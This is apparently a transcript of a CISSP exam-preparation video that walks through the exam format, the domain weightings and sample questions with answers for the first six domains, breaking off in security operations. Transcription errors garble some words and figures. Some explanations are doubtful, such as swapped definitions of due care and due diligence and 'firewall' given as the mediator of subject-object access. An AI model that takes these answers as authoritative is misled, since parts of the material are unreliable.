have to have your mental faculties
really strong during the exam the
passing score is 700 out of a possible
1000 points exam language is english
testing centers there are isc square
authorized centers where you need to
book that exam there's a huge process
that you have to follow too where you go
for the exam itself so once you have
registered on the isc square portal and
you purchase the voucher they will give
you a list of centers in your vicinity
that you can look into they'll give you
a calendar to give you the possible
dates that you can attempt the exam on
select the center select the date reach
the center at least half an hour before
the scheduled time there is a
verification so you have to carry your
identification a government issued
document either a passport driver's
license where you have to prove that you
are who you say you are and once the
verification is done only then do you
get to attempt the exam the question
formats are three types multiple choice
drag and drop and hotspots multiple
choice is the format that we are going
to look at when we look at sample
questions it's the same they give you a
question they give you four options
either one or more options need to be
chosen they will specify if there is
more than one answer to that particular
question in a drag and drop it's most
like uh more like match the following so
there will be a column a and column b
and uh they'll ask you a question and
say okay column a gives you the options
drag and drop whichever correct answer
is in c is from column a to column b and
then submit the answer if the answer is
correct you get awarded the points else
there is no negative marking the third
is a hotspot a hotspot question is
basically a diagram let's say a
architectural diagram that will be
presented to you and they will ask you
to pinpoint a certain aspect within that
diagram for example they may give you an
architectural overview of a network of
how it has been established and they
will ask you for a network-based
firewall which is the most
likeliest area that you want the
firewall to be placed in so you don't
need to know how to configure the
firewall but from an architectural
perspective you need to know where that
firewall needs to be placed for it to be
the most effective for the given
scenario in the question these are the
domains that are asked so you can see it
basically covers anything and everything
that is there in information security it
starts off with security and risk
management which weighs 15 percent in
your questions in your exam so if your
exam is 115 questions 15 would be around
we'll have around 20 20 toward questions
and risk management being one of the
most important topics for these kind of
certifications then uh asset security
which covers 210
of your questions so that's around 15
questions security architecture and
engineering this is where your
infrastructural knowledge uh your
security architecture your enterprise
architecture all those come into the
picture there are a lot of theoretical
models that you need to study in domain
3 and that covers 13 of your exam
communications and network security this
is the most technical topic within all
these eight topics this is where you
talk about networks you talk about tcp
you discuss protocols like tcp udp you
discuss different attacks
man-in-the-middle attacks toss attacks
and this basically has 14 of weightage
then you have identity and access
management which basically talks about
users subjects objects subject being the
user object being the resource and a
relationship between these to be created
where people are authorized for some
activity authenticated and only then
allowed and also held accountable for
whatever activity they have done then
you go into security assessment and
testing so vulnerability assessments
penetration test software test uh
testing sas tasks a little bit all those
will be covered in domain number six
which has 12 percent weightage then
security operations so security
operation center or the stock day-to-day
management of incidents so your incident
management would come into the picture
problem management change management all
of those things would come under domain
7 as security operations which has 13 of
weightage and then finally software
development security now you don't need
to know development or you don't need to
know any programming there are no
program based questions they're not
going to ask you how to code they're
going to ask you how to manage a
software development life cycle or a
secure software development lifecycle so
this is where your waterfall models
modified waterfall models spiral agile
devops devsecops all come into the
picture and this has 10 percent of
weightage now it is near about
impossible for everyone or anyone to get
experience across all these domains so
you will have your strong points and you
will have your weak points the task is
to identify where you're good at
understand those things make the maximum
amount of it then identify your weak
points and start developing on those if
you are able to look at it from a
theoretical perspective however if you
can get an internship or if you can get
a you can say just an insight of how it
works in the practical world it would be
very helpful now that being said as far
as cissp exam is concerned it involves a
very ideal world the real world actually
doesn't come into the question because
the real world will have a lot of
business logic to it by business logic
what do we mean every organization will
modify their projects based on the
expertise that they have based on the
talent that they have and based on the
people
or the hierarchy of the organization
that has been established so it can be
customized to each and every
organization since an exam cannot deal
with these kind of customizations we
deal with an ideal world so for the
cissp exam we assume that we have all
the resources we have all the people
that are required we have an hierarchy
in the training which is given out where
we have rules for each and every person
and job titles for each and every person
right so when we go through the training
it is very essential that we understand
what these job roles are what their
responsibilities are so that when we get
those questions we can identify which
person is going to attempt what in the
real world things are very different we
piggyback we take on multiple
responsibilities and that is something
that cissp doesn't adhere to so you have
to be very careful identify the job
roles identify the responsibilities have
that map the hierarchical map created
very well and then try to implement the
ideal world scenario from the cisp
standards to see what is going to happen
that being said let's move on let's
discuss the domains now these domains
we've already seen what we can do is we
are going to move on to the sample
questions for each and every domain once
we reach the domain we'll see what the
topics in that domain are we'll look at
the sample questions then we'll
go to the next domain see the topics in
that domain and then look at the sample
questions as well so what to study and
those sample questions revolving them so
looking at the first module or first
domain security and risk management now
this is one of the largest domains that
could be uh debatable for me i would say
the largest domain could be domain
number three security architecture and
engineering uh could also be domain
number four because it is quite
technical communications and network
security and could also be security
operations because that's incident
management change management problem
management altogether but each domain is
very important from the exam's
perspective if you're thinking about
keeping a domain for options forget it
that's not the right way to address the
exam let's start off with the first one
security and risk management this domain
teaches you all about information
systems management and this talks about
risks and everything so what we are
going to do is we are just going to go
to the official document from iic square
where these domains and their topics are
given so that's the exam outline from
cis from ic square towards cissp is the
latest document that is there available
online you can see the url in my browser
address bar and these are the eight
domains there's the exam three hours
number of questions 100 to 150 multiple
choice and advanced innovative questions
that's where the drag and drop and the
hotspot comes into the picture though
based on experience i can tell you that
of your questions will be multiple
choice 10 would either be drag and drop
and hotspots passing rate is 700 out of
1000 points exam language availability
is english those who want to attempt in
other languages it is available but then
the exam is six hours and the questions
are 250. so that's your option depending
on which language you're most
comfortable with we are going to go with
english that's the language options
coming in cissp linear exam 6 hours 250
questions everything else remains the
fee the same these are the languages
supported french german brazilian
portuguese spanish japanese simplified
chinese and korean the weightage i guess
remains the same and that's the first
domain security and risk management so
what does it pertain to understand and
apply concepts of cia confidentiality
integrity and availability in the first
video we have gone through
uh all the eight domains at quite some
length we have discussed what cia is all
about and how their interrelationship is
so if you want a deep dive or rather a
deeper dive than what we are doing for
the domains go back to the first video
uh look into that and then you can come
back to this video again so evaluate and
apply security governance principles so
we have to understand what governance is
now governance is basically having uh
overlying
architectural security policy that can
be integrated with an enterprise
architecture and thus having your
security policy in alignment with the
business goals and objectives security
should never become a hindrance for a
business security should always become a
supporting feature which should allow
the business to be executed in a secure
manner so as a security expert our first
goal is to identify what the business
does what the business processes are
what is the business trying to achieve
and then we try to create a security
policy revolving these to enhance the
business functionality uh in a overall
picture so you're looking at
organizational processes
acquisitions divestitures acquisition is
when let's say scenarios where you have
trying to create a security governance
policy now the business is trying to
change because they're trying to acquire
another organization and merge it within
this organization and now your security
policy should encompass not only your
organization but the newly acquired
organization let's say the next five
years a business decides that the newly
acquired organization is no longer
profitable and they want to sell it off
and now that's where the diverse share
comes into the picture you are now
trying to separate the entity that you
have just integrated in your security
policy and you are now trying to
separate it with confidentiality
integrity and availability of the
company's data intact without affecting
the organization at any point in time
understand the fact that security is not
only about hacking or getting hacked
it's about being secure at all points in
time
during business uh continuity and
business let's say business as usual
kind of activities so that's where your
security control frameworks would come
in you're going to talk about iso 27001
we are going to talk about cobit
pci dss nist 800 series and so on so
forth and the most two important
statements or terms in the cssp is due
care and due diligence do you care is
you doing your own research to identify
what security controls need to be
implemented or what kind of governance
needs to be implemented and due
diligence is you yourself spending that
much time money effort into implementing
those decisions that you have come come
across during the due care thus
enhancing the security functions of an
organization so when we talk about
business requirements for a business to
be effective at the same time it needs
to be legal it needs to be compliant to
regulations and laws and to the
contracts that have been created by the
organization so as far as the concept
goes when we say that security needs to
be in alignment with the business
requirements the business requirements
imply that the business is legal is
compliant to regulations is compliant to
their contractual obligations and is
following standards that have been
prescribed to them so all of them come
together and that's where your security
mapping comes into the picture we are
looking at legal and regulatory issues
like cyber crimes and data breaches
licensing and intellectual property
requirements and so on so forth and it
will also include isis squares code of
professional ethics now this is a
document apart from the eight domains
that we have talked about thus what does
this document talk about this is the
prescription from iic square of
professional ethics for a cyber security
professional expect around four to five
questions from professional ethics as
well so not only is this a document that
you need to read and adhere to you will
be questioned upon this in your exam and
these are easy points to score
professional ethics something that is
ethical something that is not against
the law so it's kind of quite easy but
the questions can be confusing so you
need to go through the entire document
really well and then your organization
will have its own code of ethics however
if you look at the hierarchy ic squares
ethics comes first so your
organizational ethics should not be
contradictory to ic squares ethics in
the first place then develop document
and implement security policies
standards procedures and guidelines
identify analyze and prioritize business
continuity requirements so here that's
where your risk assessment comes into
the picture if you're looking at a
particular risk that means a particular
vulnerability has been identified you
want to
see the likelihood of that vulnerability
being exploited and then the business
impact analysis that you may have based
on which you would then create a plan to
mitigate that particular risk by having
a business continuity or a disaster
recovery plan coming into the picture
now this is as far as this domain is
concerned you're calculating the risk it
doesn't actually tell you how to
mitigate that risk that's when you go
into the next future domains and discuss
those technicalities so you can see
contribute and enforce personal security
policies now the thing about cissp is
physical security also comes into the
picture why because if
hardware is not well protected there
would be physical attacks social
engineering attacks that could be
created which would lead to data leakage
as well and the first and the foremost
most valuable asset of an organization
is always human personnel so cissp would
also deal with people protection in the
first place for example protecting
people against social engineering
attacks making them aware about these
attacks if there are natural calamities
you have to plan a plan for them during
your disaster recovery and business
continuity plan and ensure that people
are safeguarded not only that you have
to tie these things up with identity and
access management for example account
creation account management onboarding
of employees off-boarding termination of
employees
third-party contractors consultants that
you're going to hire which are not
employees but third parties coming in to
your organization providing intelligence
and so on so forth so all of those come
into the picture as well and then that's
where your risk of management concepts
come in it gives you a very good
overview of how to identify those risks
and so on so forth now this is what the
in the first domain is all about it
itself is very huge and as we go ahead
we can tie this domain to the rest of
the domains for more deeper analysis go
to the first video and then we can come
back to this so let's start with the
questions the first question now these
are very short one-liner questions your
exams would be more descriptive to be
very honest with you if you go online no
matter what practice questions that you
try or whatever dumps if you can find
those you will find none of them will be
ever any close to the actual exam
questions you will find a lot of sites
online that sell you cissp dumps with
100 guarantee for you to clear don't
fall for that it's just a money making
scam those questions will be similar
questions something that will give you
an insight about what the exam is going
to be but when you attempt the exam you
will find out that those questions are
very different from the actual exam
itself coming back to the questions the
primary goal of security awareness
program is now what is the security
awareness program and why is it created
the primary goal so is it to provide a
platform for disclosing exposure and
risk analysis to make everyone aware of
potential risk and exposure to provide
accurate risk and exposure results a way
of communicating security procedures now
the answer to this is to make everyone
aware of potential risk and exposure
doesn't mean that you are trying to make
everybody ethical hacker what you're
trying to do is in your organization you
are trying to create a security
awareness program which allows your
employees to know what kind of policies
exist in your company what rules need to
be followed what are the procedures that
need to be followed for them to
safeguard themselves and company assets
as well and ensure that data leakage and
data loss are kept at a minimum so
you're basically trying to make everyone
aware of the risks that they may have
for example social engineering not
clicking on links not
going to unwanted sites and so on so
forth question two a contingency plan
should address which of the following
potential risks residual risks or
identified risks now what is a potential
risk a potential risk is something that
you may foresee in the future something
that may exist a residual risk will come
to that what is an identified risk a
risk that has been identified is known
to the organization and the organization
is aware of it so potential is something
that may come into the future identified
as something that exists right now a
residual risk on the other hand is a
risk that was identified earlier on
mitigated but after mitigation there is
still amount of residual risk that
exists so these terminologies need to be
understood really well for uh let me
give you an example of a residual risk
so let's say there's a sequel and
injection a flaw that has been
identified in an application and that's
a now that's now an identified risk now
you've got two options in front of you
go through a software development life
cycle again record that part of the
application to mitigate the risk or else
have a security control like a firewall
a web application firewall watching that
risk now the ideal scenario would be
that you go through the development
process again but that is going to take
time so you put in a compensatory
control uh that is a web application
firewall in the meanwhile to mitigate
that risk and then have the recoding
done and then later on resolve the risk
all together so when we put in the
firewall to mitigate the risk
temporarily is the risk actually
addressed no there is still a
possibility of a sql injection attack
happening but we just have it mitigated
to a certain extent because there is a
firewall watching it so that means that
there is still a residual risk a risk
that is remaining even after me
integrate uh implementing the security
protocol or the security control that is
what a residual risk is something that
remains even after i put in a security
control which can be taken care of later
on or can be accepted and just moved
upon so coming back to the question a
contingency plan should address which of
the following either a potential risk a
residual risk an identified risk or all
of the above and the current answer to
that is a residual risk what is a
contingency plan a contingency plan is i
still have a security control but
something may go wrong and for that i
want a secondary control to be in place
to ensure if that if the first control
fails the second control would still be
able to identify that and stop the
security incident happening so we are
looking at residual risks and then
having contingency plan to manage those
residual risks question three when the
cost of the counter measures outweigh
the cost of the risk the best way to
handle the risk is to reject the risk
transfer the risk accept the risk or
reduce the risk now there are four ways
a risk can be managed right accept the
risk avoid the risk transfer the risk or
mitigate the risk right rejecting the
risk is not an option but what is the
question cost of a counter measure
outweighs the cost of the risk so what
is the cost of a risk the cost of a risk
is basically the impact that the
organization is going to face in a
monetary manner if the risk is realized
to mitigate that we have a counter
measure in place so if in the previous
example i have identified a sequel
injection attack and the counter measure
to that is me implementing a security
control a web application firewall to
mitigate that risk however if somebody
executes that risk somebody does a
sequel injection attack the loss that
i'm facing is only a hundred dollars per
incident and the maximum incidence that
can happen in a year are 10 so 10 into
100 is 1 000
per annum is what that risk is going to
cost me for me to implement a web
application firewall on an annual level
it is going to cost me let's say fifteen
thousand dollars in licenses management
salaries and all of those things which
means that i'm facing a loss of one
thousand dollars but i'm spending
fifteen thousand dollars to prevent that
loss i rather have the thousand dollar
loss than spend fifteen thousand dollars
right so in this scenario the cost of
the counter measure is outweighing the
cost of the risk by fourteen thousand
dollars so in this scenario which is the
best way i would do it either reject the
risk which is never an option because
you cannot reject the risk transfer risk
what is transferring your risk
transferring it to a third party by
purchasing insurance example right so if
i purchase insurance saying if this uh
if this gets compromised
it's the insurance company is going to
make the payments i'm safeguarded or
accept the risk or reduce the risk so in
this scenario accepting the risk is
basically accepting the risk the way it
is moving on because there is nothing
that you can do about the risk and you
are willing to accept the risk rather
than spend money on it and reduce the
risk is mitigating the risk by
implementing the firewall and spending
that money and then incurring those
losses so the best
answer out of this is accepting the risk
why can't i transfer the risk because
there is no such insurance where i can
in the given example where i can
get that kind of an insurance policy
reducing the risk would entail me
spending that fifteen thousand dollars
to mitigate the thousand dollar risk
does incurring a 14 000 loss which is
against the business logic a business
needs to make money not spend money and
that's the fourth option that's left
that's accepting the risk which means we
are not going to implement the firewall
because it is outweighing the cost of
the risk we are just willing to accept
the risk itself and move on that's the
first domain moving on to the second
which is asset security consists of
topics about physical requirements of
information security let's go back to
the document in hand so moving on to
domain two asset security we talk about
assets assets could be now okay let's
get into the definition of what an asset
is asset could be anything that has a
monetary value associated with it from
the organization's perspective it could
be data it could be virtual assets it
could be physical assets it could be
anything and everything it could be a
license right you purchase an operating
system the operating system comes with a
virtual license that installs on your
machine or or is associated with an
email address even that license as a
value does even that license will become
a set so the basic definition is
anything and everything that is owned by
the organization and has a monetary
value associated with it right thus
you're going to we talk about asset
classification as well asset
classification could be data within data
itself there would be sub
classifications like confidential data
non confidential data public data and so
on so forth physical assets virtual
assets networking assets anything and
everything that you can come across
would be classified here determine and
maintain information and asset ownership
so
your asset management program comes into
the picture and when you say asset
ownership the organization owns the
assets as they are however roles and
responsibilities that you have created
in the organization will ensure that
some assets are virtually owned by
somebody that means that they are
responsible for the well-being of that
asset so you have to identify who for
example hr now hr is a function human
resources but they also need it assets
for example a payroll which will
institute a payroll software a database
right a web application server if you
will and all of these assets are now
owned by the hr department so there are
hundreds of people in hr so who exactly
owns this that's where we identify the
owner of that particular asset saying
you are responsible for the well-being
of these assets you belong to this
department so normally the head of that
department would be the owner of those
assets and would determine what kind of
access controls what kind of maintenance
management security mechanisms are
required then we talk about protection
privacy so data owners data processors
remnants collection limitations
determining uh ensuring appropriate
asset retention so let's say data right
uh even if i have data how long do i
retain data if you go into privacy acts
of organizations or of countries rather
so gdpr for european union gdpr
basically states that you will only
retain personal identifiable information
for as long as the organization requires
it the moment you have no reason to have
that data with you you're going to
delete that data so which means
automatically says you're going to
retain that data till it makes business
sense once you figure out it doesn't it
is not required you are going to delete
it in a secure manner which is not
recoverable to unwanted parties so you
have to determine those asset retention
periods we have to understand what those
attention retention periods are so when
you for your physical assets there will
be a life of the said that is associated
with it and once the life of that asset
is over even even if the asset is
working properly you have to discard
that asset and you have to replace it
you have to do this with security in
mind then the security controls for all
of these things understanding data
states data states could be in three
different aspects data in motion data at
rest and data in use how are you going
to secure data during all these three
stages what are the protection methods
that you're going to utilize then in
establishing information asset handling
requirements so that's what domain 2 is
all about let's look at the questions so
the first question in domain 2 which of
the following is responsible for setting
user clearances to computer-based
information is it operators data owners
security administrators or data
custodians understand the question who
is responsible for setting your user
clearances to computer-based information
and the correct answer to that is
security administrators they are
responsible for setting the user
clearances who are going to be
responsible for allowing the user
clearances that's going to be data
owners what is generally concerned with
personal security management controls
operational controls technical controls
are human resource controls now what is
personal security personal security is
people-centric security you're looking
at people and you're ensuring that their
security comes into the picture
technical controls can be used for data
assets or physical assets like
information technology but technical
controls may not be that relevant for a
human a firewall is not going to help
anyone any which ways management
controls are administrative controls
that means a policy that will help you
implement controls but for personal
security is the operational controls
that are going to be associated with it
which of the following factors
determines the frequency of information
security audits in any given environment
so the age-old question for you to
remain secure how often do you want to
conduct a security audit to verify your
vulnerabilities your penetration test to
verify your security controls are
working properly so would it be
dependent upon asset value the risk
based approach management discretion or
level of realized threats and here the
answer to that question is risk the
moment a risk is identified for example
at what various stages would a security
audit be triggered for an individual
asset as well and that can be tied down
to incident management change management
and problem management so if there is an
incident a security incident with a
database server where there has been an
attack on that server i probably want
the security audit done on that server
to identify vulnerabilities flaws and
then to mitigate those risks similarly
if there is a change that has been going
on into your organization you first want
to go into a risk assessment strategy
and then you want to look at security
audits based on the risk that you have
identified right so a security audit is
not only periodic based on compliances
or regulations but it also can be
integrated really well in your incident
management problem management and change
management scenarios that's domain
number two all right let's talk about
domain three security architecture and
engineering now this is where you tie up
security architecture and enterprise
architecture if you look at the first
domain we have talked about risk
assessments we have talked about
confidentiality integrity and
availability and then we have moved on
to the second domain where we talked
about asset security so that's where we
talked about data data classification
asset classification now it starts off
with the enterprise level architecture
so something like togaf what is
enterprise level architecture it's
basically data center architect and a
network architect trying to create data
flows deciding how communications are
going to happen between various devices
they're going to try to do network
segmentation for web application servers
database servers look at network
isolations network access control lists
and may even decide how firewalls and
where firewalls would be required once
that architecture is created we need to
secure that architecture to ensure that
whatever data communications are
happening within that framework they are
secured in a manner where all the risks
that the organization may be exposed to
are either managed mitigated accepted
transferred whichever the way it is
right so here you start off with
physical security you start up with
trusted platform modules so looking at
the outline this is where it starts off
with implement and manage engineering
processes using secure design principles
so this domain will talk about using
togaf and then using a zac man framework
to interact with all the data owners uh
all the asset owners
querying them about the security of the
assets the requirements because it is
not the security architect who
determines how secure the device will be
it is the asset owner who determines the
requirement of security for example
continuing with the hr example that we
were talking about earlier if the hr
department of head is responsible for
the database for the payroll application
it is that person who would be
determining the security levels so
based on the security architecture let's
say zachman framework we would uh create
a questionnaire that needs to be filled
out by the asset owner the hr department
of head and would be supplied to us the
security heads and then we would try to
create a security profile based on their
requirements so if the hr
department head comes back to me and
says that they require to be adhering to
a particular standard or they want x
kind of security it is us who will
validate that requirement and it is us
who will execute it and protect that
asset based on the requirements so this
is where your service security
architecture meets enterprise
architecture by using various frameworks
this domain will introduce you to not
only zachman framework it will again
take you to a trusted platform module it
will talk about id sec tc sec common
criteria and so on so forth so this is
again a very extensive module some
people struggle with it because it is a
largely a theoretical module and some
people would struggle with the concept
of how what is a security architecture
and an enterprise architecture it is
very important to understand the
differences between them for example
togaf is an enterprise architecture
where a data center architect would
deploy and streamline those devices on
which a layer of security architecture
such as iso 27001 would be implemented
to enhance the security and ensure that
the infrastructure remains protected at
all point in time this module will also
deal with managing vulnerabilities uh on
assets uh applications web-based systems
mobile systems and embedded devices so
this is where your engineering comes
into the picture by this module we mean
when we are deploying infrastructure we
need to engineer it with security in
mind we need to architect in such a way
that security enhances the business
needs business requirements and they are
executed in a secure manner let's look
at a few questions based on domain 3
question 1 when a computer uses more
than one cpu in parallel to execute
instructions it is known as
multi-processing multitasking
multi-threading or parallel running now
here we need to understand what is the
difference between multi-tasking
multi-threading multiprocessing and
parallel running now it would be very
difficult to explain all these processes
in in this video so uh here we are
talking about executing instructions
that's multi-processing multitasking is
performing multiple tasks at the same
time multi-threading is where processors
create their multiple threads to manage
certain functions
here when we are parallely executing
instructions it is known as
multiprocessor question two who mediates
all access relationships between
subjects and objects of a system now
what is a subject what is an object and
what are access relationships so access
relationships would be your permissions
that you have created now what are
permissions permissions
would be something that a person is
authorized to do so if you look at the
cia which we discussed in the module one
confidentiality integrity and
availability how do we keep data
confidential by only allowing authorized
users access to that data what are
authorized users authorized users are
people's people who have been identified
and are allowed access to certain
resources how do we do that by having an
identity and access management platform
in place which will be discussed later
in the next domain but confidentiality
would include i triple a standards i
triple a starts with identification
authentication authorization and
accountability identification is
identifying the person who they are
authentication is verifying that they
are actually who they claim to be
authorization is where the access
relationships come into the picture
where we once we have authenticated a
user we are creating a matrix which
allows them access to certain resources
to a certain extent some may have read
only access some may have modify access
some may have delete access etc so in
this scenario we are talking about
access relationships between subjects
and objects of a system and who mediates
that now when you say reference kernel
information flow model or security
kernel of firewall in this particular
scenario for this particular question
based on the options that are available
we are talking about a rule-based access
control system which means that we have
created rules of what is allowed into a
network and how what is not allowed
within the network this can be
controlled by using a firewall so this
can be controlled by using a firewall
question three which of the following is
not a spam blocking architecture now
what is spam and how are you going to
block it it can be at the client side it
can be on the email server by way of
identified spam filters could be
application based in this scenario mail
blocking service is basically you
creating a blacklist which will block
emails from certain addresses or from
certain things so this is not a spam
blocking architecture it's basically a
blacklist where you're blocking emails
but spam blocking architecture could
either be at the email server based
could be at the client side where
they're using let's say microsoft
outlook express and their created rules
within it or could be on an application
where you have configured rules over
there moving on to domain four now this
is where the technicalities come into
the picture communication and network
security the network security domain
covers topics focused on protecting the
network of an organization so
communications tcp channels udp channels
the tcp so you come across the osi layer
you map the osi layer with the tcp ip
layer and see how a data fragment packet
is created looking at domain four we are
talking about the osi layer open systems
interconnection uh compared to the tcp
ip or the transmission control protocol
over internet protocol models you're
talking about internet protocol itself
we're talking about converged protocol
software defined networks wireless
networks then we're talking about
securing network components so we talk
about firewalls types of firewalls and
point security network access control
devices and we look at them over
virtualized networks wipe multimedia
looking talked about talking about
remote access data communications right
so all of this is concerned within
domain four now osi and tcp itself could
take hours for people to understand to
people to comprehend how computers work
now these are theoretical models and we
need to create an understanding of how
theory merges with the practical world
let's look at a few questions what is
the purpose of using a vpn now the sense
over here is what is a vpn or a virtual
private network how is it created what
technologies can be utilized within it
what encryption mechanisms can be
utilized and why are we creating that
encryption mechanism in the first place
so is it to secure remote access into a
network securely connect two networks
together secure data within the network
or all of the above so here with a vpn
we are basically trying to do everything
uh we are trying to create encrypted
tunnel between two systems or two
networks where data can be transmitted
in a secure manner where
man-in-the-middle attacks or network
based attacks would be mitigated a vpn
can secure packets from data link layer
onwards to the application layer
question two which of the following
characteristics are not included in the
tcp protocol now what is a tcp protocol
tcp is a connection oriented protocol it
is a reliable protocol that is utilized
to communicate between our servers in a
reliable manner so a tcp protocol being
a connection oriented protocol which is
reliable in nature so which of the
following characteristics are not
included connection less protocol that
is the udp protocols have this is not
included in the tcp protocol question
three which
if you remember the previous slide would
be the udp protocol a udp protocol is a
protocol that is used for its speed
rather than reliability when it is
real-time processing that is required we
use udp so most of our voip
communications would happen over udp
protocols okay so looking at domain
number five domain five talks about
identity and access management so this
ties up with your asset management your
risk management because if we go back to
the confidentiality integrity and
availability aspect of it identity and
access management is basically allowing
authorized users access to resources by
authenticating them and also holding
them accountable so this becomes the
sense of how you're going to allow
people to access the resources that you
have in your organization let's look at
what this domain covers it will talk
about physical and logical access to
assets so servers need to be protected
by putting them in a secure server room
does this
restricting access to them and allowing
access only to those few people who
require access to them once we have
secured those servers uh this is where
we talk about physical security whereas
we got a secure room we are going to
monitor that room we will have access
controls we will have guards monitoring
who is getting access or who's trying to
get access to that environment and then
you're going to create logical access as
well where we let's say have swipe cards
on the door locks so anyone with logical
swipe card can access that particular
facility you're also looking at managing
identification and authentication of
people devices and services so here we
are going to talk about authentication
mechanisms single authentication
multi-factor authentication we are
talking about single sign-ons we will
talk about federated identity management
modules we'll look at casbi or cloud
access service brokers we'll talk about
session management from applications and
so on so forth we will also talk about
third party identity as a service
provider where we integrate those
identities like open id into our
organization and we validate people
based on the identity that they have
created with those organizations then we
talk about access control list which
would be role based access controls
mandatory access controls discretionary
access controls attribute-based access
controls rule-based access controls and
then there are a lot of theoretical
models that are integrated in this
module which talk about lattice-based
approach which will talk about other
theoretical models which will help you
align how identity and access management
is implemented in an organization so at
this point in time we will also be
looking at a life cycle of how
identities are managed for example
onboarding of people deboling of people
termination of employees employees as
they move within the organization by
getting promotions demotions or changing
departments and assuming a new role so
here we talk about how we can provision
an identity how we can de-provision an
identity how it is to be managed we are
going to create a
relationship between the creator of this
identity and the approver who's going to
be a manager so even if somebody is
allowed to create an identity they will
only create it if they have an approval
from appropriate manager so let's look
at questions from domain number five the
first one which of the following is the
most important factor while selecting a
biometric system for securing critical
assets now here the domain talks about
the types of authentication mechanisms
there are five types essentially three
basic types which talk about something
that you know which is a password
something that you have a swipe card
someone that you are a biometric
somewhere that you are location based
and something that you do like capture
so these are the five basic
authentication types or mechanisms that
you can utilize in an organization
multifactor authentication is having
multiple of these options in integrated
in our identity and access management
module to enhance the security now
coming back to biometrics biometrics
have positives and negatives amongst
them so uh with the biometric there are
two types that we talk about false race
of curry uh false acceptance rate and
false rejection rate what is the false
acceptance rate uh somebody let's say
you are using a thumb print to
authenticate people somebody put down
their thumbprint the person is not
actually authorized however it was read
incorrectly and the door got unlocked
and the person got access to that
particular area which is a false
acceptance rate a false rejection rate
is an author authenticated or authorized
person actually trying their thumbprint
but it not getting recognized does they
did not get access to the area or to the
device that they wanted now the question
here is which of the following is the
most important factor while selecting a
biometric system for securing critical
assets now would i want to focus on
false rejection rate or false acceptance
rate then we also have equal error rate
and maximum allowable downtime maximum
allowable downtime is if the biometric
measure fails and if nobody's getting
access to any of the resources to what
level or to what extent would my
business be able to tolerate such an
outage here the
correct answer is the false acceptance
rate because if an unauthorized person
gets access to my devices that's the
worst case scenario if the biometric
system is down and nobody's getting
access that may still be acceptable
rather than having an unauthorized
person getting access to very sensitive
data false rejection rate is also
detrimental to the organization however
it is not as bad as having a false
acceptance rate introduced in the
organization
the second question which are the two
major factors to measure biometric
performance again the question from the
previous one far false acceptance rate
and fr false rejection rate or fse and
err ier and far fr and gic
they don't actually relate so the
correct answer here is far false
acceptance rate and false rejection rate
so these are the two major factors false
rejection rate may still be a little bit
acceptable but a false acceptance rate
is not tolerable at all next question a
commercial application for steganography
that is used to identify documents or
verify that authenticity is either a
digital checksum an md5 hash a digital
signature or a watermark now here the
keywords matter we are talking about
steganography so suddenly people start
thinking about hiding data within data
and then if you just isolate the words
identify documents or verify their
authenticity we
basically directly go to a digital
signature because that's what we utilize
for non-repudiation however what the
question refers to is an application for
stiganography seconography is hiding
some element which would be visible only
to known people we can utilize
steganography on for to benefit our
ourselves or our organization uh by
using it to identify the authenticity of
a document so if i i'm going to print
out a document maybe a watermark on the
document which is not visible to the
naked eye but when i want to validate
the document i would search for that
particular watermark and that is the
correct answer for this particular
question so that's what domain five is
all about all right let's look at domain
number six which is security assessment
and testing now this domain is all about
assessments auditing strategies
and testing so uh from this domain what
you're going to take away is talking
about internal audits external audits
third party audits in the security
control testing uh strategizing about
how we
implement a vulnerability management
system a program within the organization
that is reputable consistent and
measurable can be tied up with other
management programs like patch
management incident management and
anything and everything
that requires a vulnerability assessment
like even change management if something
is going to change in an organization
you can have a vulnerability assessment
done before you want to even think about
allowing it or disallowing that change
similarly with penetration testing to
validate the vulnerabilities that you've
identified uh log reviews having a siem
tool that will help you analyze or
create a patent analysis of what's
happening within the infrastructure
what's happening within the organization
from a security perspective then you're
talking about collecting security
process data account management when we
say account management identity and
access management life cycle so
onboarding of an employee off-boarding
of an employee the lateral movements of
an employee in an organization when
they're getting promoted or they are
transferred in from one department to
another right so all of these would come
under security assessment and testing to
see how those policies are functioning
to analyze the
effectiveness of those policies does the
requirement for conducting vulnerability
assessment and penetration tests so
let's look at a few questions on this
domain and let's start off with the
first one which of the following ways
requires the involvement of an
information security analyst so out of
these four options assistance
requirements definition system design
program development or program testing
during which phase
would you involve a security analyst now
for this we first need to identify why
we require a security analyst what is
the job requirement what is the
activity that is going to be conducted
by a security analyst right so in this
scenario the correct answer is program
testing in the dev program development
phase uh we won't need an analyst we
would need a program manager and
architects who can develop a particular
program
who can give it some semblance of what
needs to be achieved in the system
design it would be again an architect
who's going to develop that system in
the systems requirements definition
again so in the systems requirements
definition it's a requirement gathering
about what is
what you need to adhere to what is going
to be the baseline that you're going to
create so from these four options you
need to identify where would you place a
security analyst right in the exam it's
the most probable answer that you're
looking for it's not the most idealistic
answer right so from these four options
security analyst would most likely be
involved in the program testing phase
rather than any other phase the second
question which of the following
techniques is generally not used for
monitoring purposes now when you say
monitoring what is monitoring monitoring
is looking into logs activities
anything and everything that has already
happened so you are reacting to
something that has already happened and
which of these following techniques is
not used for monitoring so you're
collecting logs you're analyzing those
logs what would be not be utilized a
penetration test intrusion detection
violation processing or counter measures
testing right now when you're monitoring
you would monitor a penetration test to
analyze if the test was successful or
not intrusion detection that's the first
input that you look at for analysis
violation processing anything is
violated any processes any policies you
analyze them and you uh you monitor them
does you come to know that this has
happened in countermeasures testing
there's basically a test of the
effectiveness of the countermeasures
that are already implemented at that
point in time you may not be monitoring
these the software program that acts on
behalf of user in their absence to carry
out operations is known as an agent worm
applet or a browser so a program that
acts on behalf of a user in their
absence to carry out operations is
either an agent an appellate or a worm
or a browser a browser is nothing but a
software that allows you to serve the
internet a worm is a malicious
application that would be more
of a nuisance value than anything else
an appellate is a something that allows
you interconnectivity an agent is
something that will that can be
automated used for automated tasks and
can run those tasks in the absence of a
particular user so if you look at these
questions understanding what each and
every word means understanding and
highlighting the keywords in the
question itself and then analyzing the
scenario that you are placed in and then
identifying the most appropriate answer
for that particular question that is how
you want to approach a cissp exam
looking at the next domain domain number
seven and that's security operations
let's look at what security operations
has for us now in security operations
you're looking like looking at a sock a
security operation center so your
regular volatility management incident
management uh problem management change
management placing controls
analyzing all that information so
probably having an siem tool configuring
this iem tool collecting all those data
so identifying event sources what are
event sources when i have an siem
implemented i am not going to expect
this iem to automatically
start collecting data all by itself and
then again i don't expect the sim tool
to understand what kind of data it needs
to collect so for me in a security
operation center
after i've installed an siem tool i
first need to configure it to identify
which devices i want to monitor from
which devices i want to collect that
information
and where do i want to store it once i
have all that information in place after
